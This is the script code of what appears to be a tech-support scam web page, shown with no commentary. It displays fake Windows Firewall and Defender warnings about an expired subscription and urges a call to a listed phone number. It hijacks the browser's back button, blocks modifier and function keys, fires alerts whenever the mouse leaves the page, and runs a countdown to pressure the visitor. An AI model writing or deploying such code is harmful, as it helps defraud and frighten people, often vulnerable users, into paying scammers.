      <script type="text/javascript">    
    function showAlert() {
    alert("Wait!\n\nWindows Firewall has detected that you have not updated your Windows Defender Anti-Virus software.\n\n Please renew subscription to continue. If your PC is unprotected, it is at risk for viruses and other malware. Contacts Us +1 (323)-902-6668")
}

$(function() {
     $(document).mouseleave(function() {
        window.onbeforeunload = null;
        showAlert();
    });
});
window.onload = function() {
    function timer() {
        var timeleft01 = 250;
        var countdownSeconds01 = setInterval(function() {
            timeleft01--;
            document.getElementById("countDownTimer").innerHTML = timeleft01;
            if (timeleft01 <= 0) clearInterval(countdownSeconds01)
        }, 1000)
    }
    timer()
}

}

document.onkeydown = function(e) {
    e = window.event || e;
    var keycode = e.keyCode || e.which;
    if (e.ctrlKey || e.altKey || e.shiftKey || keycode >= 112 && keycode <= 123) {
        if (window.event) { // ie  
            try {
                e.keyCode = 0;
            } catch (e) {}
            e.returnValue = false;
        } else { // ff other 
            e.preventDefault();
        }
    }
}
</script>


    <script type="text/javascript">
      //history
      var ii = 0; // needed for safari
      if (typeof history.pushState === "function") {
        history.pushState("back", null, null);
        window.onpopstate = function () {
          history.pushState('back', null, null);
        };
      }
      setTimeout(function(){ii = 1;},200);

      //no exit 
      function noExit() {
            alert("Your Windows Defender subscription have expired.\n\nAfter the expiration date, your computer will become susceptible to many different virus threats. Please renew subscription to continue. If your PC is unprotected, it is at risk for viruses and other malware. Contacts Us +1 (323)-902-6668");
      }
      $(document).mouseleave(function() {
          noExit(); sound();
      });
    </script>



